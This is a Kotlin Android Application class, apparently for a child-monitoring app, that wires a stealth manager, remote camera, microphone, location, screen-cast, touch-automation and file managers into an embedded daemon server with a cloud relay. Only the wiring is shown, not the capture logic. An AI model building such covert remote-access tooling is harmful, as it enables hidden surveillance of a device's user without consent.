package com.example

import android.app.Application
import com.example.data.local.DaemonDatabase
import com.example.data.local.DaemonRepository
import com.example.data.network.CloudRelayClient
import com.example.engine.EmbeddedDaemonServer
import com.example.engine.FileManager
import com.example.engine.RemoteAudioManager
import com.example.engine.RemoteCameraManager
import com.example.engine.RemoteLocationManager
import com.example.engine.ScreenCastEngine
import com.example.engine.StealthManager
import com.example.engine.TouchAutomationEngine

class AirDroidChildApp : Application() {

    companion object {
        lateinit var instance: AirDroidChildApp
            private set

        var repository: DaemonRepository? = null
            private set

        var stealthManager: StealthManager? = null
            private set

        var touchEngine: TouchAutomationEngine? = null
            private set

        var fileManager: FileManager? = null
            private set

        var screenCastEngine: ScreenCastEngine? = null
            private set

        var cameraManager: RemoteCameraManager? = null
            private set

        var audioManager: RemoteAudioManager? = null
            private set

        var locationManager: RemoteLocationManager? = null
            private set

        var daemonServer: EmbeddedDaemonServer? = null
            private set
    }

    override fun onCreate() {
        super.onCreate()
        instance = this

        val database = DaemonDatabase.getInstance(this)
        repository = DaemonRepository(database.daemonDao())

        stealthManager = StealthManager(this)
        touchEngine = TouchAutomationEngine(this)
        fileManager = FileManager(this)
        screenCastEngine = ScreenCastEngine(this)
        cameraManager = RemoteCameraManager(this)
        audioManager = RemoteAudioManager(this)
        locationManager = RemoteLocationManager(this)

        daemonServer = EmbeddedDaemonServer(
            context = this,
            touchEngine = touchEngine!!,
            fileManager = fileManager!!,
            screenCastEngine = screenCastEngine!!,
            cameraManager = cameraManager!!,
            audioManager = audioManager!!,
            locationManager = locationManager!!,
            stealthManager = stealthManager!!
        )

        CloudRelayClient(this).startIfPaired()
    }
}
